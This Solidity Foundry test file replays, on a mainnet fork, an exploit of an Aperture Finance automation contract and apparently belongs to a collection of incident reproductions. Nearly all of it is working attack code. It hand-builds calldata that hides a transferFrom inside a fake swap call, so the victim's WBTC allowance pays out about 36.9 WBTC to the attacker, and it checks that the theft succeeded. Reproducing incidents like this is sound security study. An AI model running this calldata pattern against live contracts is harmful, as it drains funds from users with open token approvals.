// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: Aperture Finance
@Date: 2026-01-25
@Attacker: 0xe3E73f1E6acE2B27891D41369919e8F57129e8eA
@Target: 0xD83d960deBEC397fB149b51F8F37DD3B5CFA8913
@TxHash: 0x8f28a7f604f1b3890c2275eec54cd7deb40935183a856074c0a06e4b5f72f25a
@ChainId: 1
@GasUsed: 708618
*/

contract Aperture_FinanceTest is BaseTest {
    address constant APERTURE_AUTOMAN = 0xD83d960deBEC397fB149b51F8F37DD3B5CFA8913;
    address constant WBTC_ADDR = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VICTIM = 0x5240B03Be5Bc101A0082074666dd89aD883e1f9d;
    address constant ATTACKER = 0xe3E73f1E6acE2B27891D41369919e8F57129e8eA;
    address constant ATTACKER_CONTRACT = 0x5c92884dFE0795db5ee095E68414d6aaBf398130;
    address constant MALICIOUS_SWAP_TARGET = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    uint256 constant MSG_VALUE = 100;
    uint256 constant STOLEN_WBTC = 0xDC0DE334; // 36.91897652 WBTC (8 decimals)
    uint256 constant EXPLOIT_BLOCK = 24313233;
    uint256 constant EXPLOIT_TIMESTAMP = 0x69765C9B;

    function setUp() public {
        // Use the block before the exploit tx block so the tx can be replayed on fork state.
        vm.createSelectFork("mainnet", 24313232);
        target = APERTURE_AUTOMAN;
        fundingToken = WBTC_ADDR;
        beneficiary = ATTACKER;

        vm.label(APERTURE_AUTOMAN, "Aperture_Automan");
        vm.label(WBTC_ADDR, "WBTC");
        vm.label(WETH_ADDR, "WETH");
        vm.label(VICTIM, "Victim");
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACKER_CONTRACT, "Attacker_Contract");
        vm.label(MALICIOUS_SWAP_TARGET, "Malicious_Swap_Target");
    }

    function testExploit() public balanceLog {
        uint256 allowance = IERC20(WBTC_ADDR).allowance(VICTIM, APERTURE_AUTOMAN);
        console.log("Victim WBTC Allowance to Aperture:", allowance);
        require(allowance >= STOLEN_WBTC, "Precondition failed: insufficient victim allowance");

        uint256 victimBalanceBefore = IERC20(WBTC_ADDR).balanceOf(VICTIM);
        uint256 attackerBalanceBefore = IERC20(WBTC_ADDR).balanceOf(ATTACKER);

        console.log("Victim WBTC Balance (Before):", victimBalanceBefore);
        console.log("Attacker WBTC Balance (Before):", attackerBalanceBefore);
        console.log("Fork block (before roll):", block.number);
        console.log("Fork timestamp (before warp):", block.timestamp);

        // Attack tx calldata (0x8f28...f25a), rebuilt byte-for-byte.
        // ABI layout: head = static values + offsets / tail = dynamic payloads (varg2, varg3, varg9, varg13).
        bytes memory exploitData = bytes.concat(
            abi.encodePacked(
                bytes4(0x67b34120),
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x64)), // matches msg.value (100 wei)
                abi.encode(uint256(0x220)), // varg2 offset
                abi.encode(uint256(0x240)), // varg3 offset
                abi.encode(uint256(0x05543DF729C000)),
                abi.encode(uint256(0x04D8C55AEFB8C05B5C000000)),
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x01)),
                abi.encode(uint256(0x260)) // varg9 offset (swap execution descriptor)
            ),
            abi.encodePacked(
                abi.encode(uint256(0x01)),
                abi.encode(uint256(0x01000276A4)),
                abi.encode(address(0xfFfd8963eFD1fc6a506488495d951d5263988d24)),
                abi.encode(uint256(0x420)), // varg13 offset (pool/mint config)
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x4B0)),
                abi.encode(uint256(EXPLOIT_TIMESTAMP)),
                abi.encode(uint256(0x00)), // varg2.length = 0 (skip optional branch)
                abi.encode(uint256(0x00)), // varg3.length = 0 (skip optional branch)
                abi.encode(uint256(0x1A0)), // varg9.length
                abi.encode(uint256(0x20)),
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x0A)), // amount approved to spender (10 wei WETH)
                abi.encode(uint256(0x00)),
                abi.encode(uint256(0x00))
            ),
            abi.encodePacked(
                // Root cause demonstration:
                // spender (approve target) looks like a router, but actual call target is a token contract.
                abi.encode(MALICIOUS_SWAP_TARGET), // spender used in approve(...)
                abi.encode(WBTC_ADDR), // actual low-level call target
                abi.encode(uint256(0xE0)),
                abi.encode(uint256(0x64)), // nested call payload length (100 bytes)
                bytes4(0x23B872DD), // transferFrom(address,address,uint256)
                abi.encode(VICTIM), // from
                abi.encode(ATTACKER), // to
                abi.encode(uint256(STOLEN_WBTC)), // amount
                bytes28(0)
            ),
            abi.encodePacked(
                // varg13: pool config used later for mint flow completion
                abi.encode(uint256(0x60)),
                abi.encode(address(0x45804880De22913dAFE09f4980848ECE6EcbAf78)),
                abi.encode(WETH_ADDR),
                abi.encode(uint256(0x2710))
            )
        );
        
        vm.roll(EXPLOIT_BLOCK);
        vm.warp(EXPLOIT_TIMESTAMP);
        console.log("Replay block:", block.number);
        console.log("Replay timestamp:", block.timestamp);

        vm.deal(ATTACKER_CONTRACT, 1 ether);
        vm.prank(ATTACKER_CONTRACT);
        (bool success, bytes memory ret) = target.call{value: MSG_VALUE}(exploitData);
        require(success, "Exploit execution failed");

        uint256 victimBalanceAfter = IERC20(WBTC_ADDR).balanceOf(VICTIM);
        uint256 attackerBalanceAfter = IERC20(WBTC_ADDR).balanceOf(ATTACKER);

        console.log("Victim WBTC Balance (After):", victimBalanceAfter);
        console.log("Attacker WBTC Balance (After):", attackerBalanceAfter);
        console.log("Stolen WBTC:", attackerBalanceAfter - attackerBalanceBefore);

        require(attackerBalanceAfter - attackerBalanceBefore == STOLEN_WBTC, "Attack failed: stolen amount mismatch");
        require(victimBalanceBefore - victimBalanceAfter == STOLEN_WBTC, "Attack failed: victim loss mismatch");
    }
}
